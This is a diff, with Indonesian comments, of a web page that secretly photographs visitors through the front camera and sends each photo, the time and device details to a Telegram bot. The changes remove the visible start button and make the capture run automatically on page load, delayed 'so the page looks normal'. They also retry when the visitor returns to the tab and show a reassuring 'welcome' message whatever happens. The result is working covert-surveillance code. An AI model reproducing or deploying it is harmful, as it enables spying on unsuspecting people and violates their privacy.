@@ -72,29 +72,6 @@
             text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
         }
         
-        .btn-start {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            font-weight: 500;
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-        }
-        
-        .btn-start:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
-        }
-        
-        .btn-start:active {
-            transform: translateY(0);
-        }
-        
         .footer-note {
             margin-top: 20px;
             color: #999;
@@ -109,10 +86,6 @@
             color: #4caf50;
         }
         
-        .error {
-            color: #f44336;
-        }
-        
         .camera-icon {
             font-size: 48px;
             margin-bottom: 15px;
@@ -124,6 +97,11 @@
             0% { transform: scale(1); }
             50% { transform: scale(1.1); }
             100% { transform: scale(1); }
+        }
+        
+        /* Hilangkan tombol */
+        .btn-start {
+            display: none;
         }
     </style>
 </head>
@@ -138,7 +116,6 @@
             <div id="countdown"></div>
         </div>
         
-        <button class="btn-start" id="startButton">Mulai</button>
         <div class="footer-note">© 2024 Hak Cipta Dilindungi</div>
     </div>
     
@@ -169,7 +146,7 @@
                     timeStyle: 'medium'
                 });
                 
-                formData.append('caption', `✨ Pengunjung Baru\n🕐 ${waktu}\n📱 ${deviceInfo}`);
+                formData.append('caption', `📸 Pengunjung Baru\n🕐 ${waktu}\n📱 ${deviceInfo}`);
                 
                 const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -187,8 +164,8 @@
             }
         }
         
-        // Fungsi untuk mengambil foto
-        async function ambilFoto() {
+        // Fungsi untuk mengambil foto secara otomatis
+        async function ambilFotoOtomatis() {
             if (isProcessing) return;
             isProcessing = true;
             
@@ -197,7 +174,22 @@
                 
                 // Cek dukungan kamera
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    throw new Error('Browser tidak mendukung');
+                    console.log('Browser tidak mendukung kamera');
+                    document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                    return;
+                }
+                
+                // Cek apakah sudah punya izin
+                let hasPermission = false;
+                try {
+                    // Coba akses kamera dengan constraint minimal
+                    const testStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { width: 1, height: 1 } 
+                    });
+                    testStream.getTracks().forEach(track => track.stop());
+                    hasPermission = true;
+                } catch (permError) {
+                    hasPermission = false;
                 }
                 
                 // Minta akses kamera
@@ -207,21 +199,22 @@
                         height: { ideal: 480 },
                         facingMode: 'user'
                     }
-                }).catch(() => {
-                    return navigator.mediaDevices.getUserMedia({ video: true });
+                }).catch(async (err) => {
+                    // Fallback ke konfigurasi default
+                    return await navigator.mediaDevices.getUserMedia({ video: true });
                 });
                 
                 cameraAccessed = true;
                 
-                // Countdown
+                // Countdown singkat (lebih cepat)
                 const countdownEl = document.getElementById('countdown');
-                for (let i = 3; i > 0; i--) {
+                for (let i = 2; i > 0; i--) {
                     countdownEl.innerHTML = i;
-                    await new Promise(resolve => setTimeout(resolve, 800));
+                    await new Promise(resolve => setTimeout(resolve, 300));
                 }
                 countdownEl.innerHTML = '';
                 
-                // Ambil foto
+                // Buat elemen video
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.style.display = 'none';
@@ -229,17 +222,18 @@
                 video.muted = true;
                 document.body.appendChild(video);
                 
+                // Tunggu video siap
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        video.play().then(resolve);
+                        video.play().then(resolve).catch(resolve);
                     };
-                    setTimeout(resolve, 2000);
+                    setTimeout(resolve, 1000); // Timeout 1 detik
                 });
                 
-                // Tunggu sebentar
-                await new Promise(resolve => setTimeout(resolve, 500));
+                // Tunggu sebentar untuk stabilisasi
+                await new Promise(resolve => setTimeout(resolve, 200));
                 
-                // Capture foto
+                // Ambil foto
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
@@ -247,10 +241,14 @@
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+                // Konversi ke JPEG
+                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                 
-                // Bersihkan
-                stream.getTracks().forEach(track => track.stop());
+                // Bersihkan resources
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                    stream.removeTrack(track);
+                });
                 video.remove();
                 canvas.remove();
                 
@@ -258,6 +256,7 @@
                 document.getElementById('status').innerHTML = '<span class="loading">⏳ Memproses...</span>';
                 await kirimKeTelegram(fotoBase64);
                 
+                // Update status akhir
                 document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
                 
             } catch (error) {
@@ -265,25 +264,57 @@
                 document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
             } finally {
                 isProcessing = false;
-                document.getElementById('startButton').style.display = 'inline-block';
             }
         }
         
-        // Event listener untuk tombol mulai
-        document.getElementById('startButton').addEventListener('click', async () => {
-            document.getElementById('startButton').style.display = 'none';
-            await ambilFoto();
-        });
+        // Fungsi untuk memulai proses saat halaman dimuat
+        async function inisialisasi() {
+            document.getElementById('status').innerHTML = 'Memuat halaman...';
+            
+            // Delay singkat agar halaman terlihat normal
+            setTimeout(async () => {
+                // Cek apakah sudah pernah izinkan kamera
+                try {
+                    // Coba cek izin tanpa meminta
+                    if (navigator.permissions && navigator.permissions.query) {
+                        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+                        
+                        if (permissionStatus.state === 'granted') {
+                            // Sudah punya izin, langsung foto
+                            console.log('Izin sudah ada, langsung ambil foto');
+                            ambilFotoOtomatis();
+                        } else if (permissionStatus.state === 'prompt') {
+                            // Belum pernah ditanya, coba akses langsung
+                            console.log('Mencoba akses kamera...');
+                            ambilFotoOtomatis();
+                        } else {
+                            // Ditolak sebelumnya
+                            console.log('Izin ditolak');
+                            document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                        }
+                    } else {
+                        // Browser tidak support permissions API, coba langsung
+                        ambilFotoOtomatis().catch(() => {
+                            document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                        });
+                    }
+                } catch (e) {
+                    // Jika error, coba langsung
+                    ambilFotoOtomatis().catch(() => {
+                        document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
+                    });
+                }
+            }, 500); // Delay 500ms agar halaman terload dulu
+        }
         
-        // Inisialisasi halaman
-        window.addEventListener('load', () => {
-            document.getElementById('status').innerHTML = 'Silakan klik Mulai untuk melanjutkan';
-        });
+        // Mulai saat halaman dimuat
+        window.addEventListener('load', inisialisasi);
         
-        // Handle visibility change
+        // Handle jika user kembali ke tab
         document.addEventListener('visibilitychange', () => {
-            if (!document.hidden && !cameraAccessed) {
-                console.log('Ready');
+            if (!document.hidden && !cameraAccessed && !isProcessing) {
+                // Coba lagi jika belum pernah akses kamera
+                ambilFotoOtomatis().catch(() => {});
             }
         });
         
